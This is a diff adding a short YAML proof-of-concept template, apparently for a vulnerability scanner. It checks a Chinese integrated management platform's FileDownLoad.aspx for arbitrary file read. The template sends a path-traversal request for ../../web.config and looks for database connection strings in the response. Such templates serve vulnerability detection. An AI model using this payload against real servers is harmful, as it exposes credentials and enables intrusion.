@@ -1,0 +1,13 @@
+id: poc-yaml-ydhz-zh-integrated-management-platform-filedownLoad.aspx-arbitrary-file-read
+info:
+  name: 银达汇智 智慧综合管理平台 FileDownLoad.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ASP.NET
+requests:
+- method: GET
+  path: /Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config
+  expression: status_code == 200 && contains(body, "System.Data.SqlClient") && contains(body,"<connectionStrings>")
+variables: {}
+transport: http
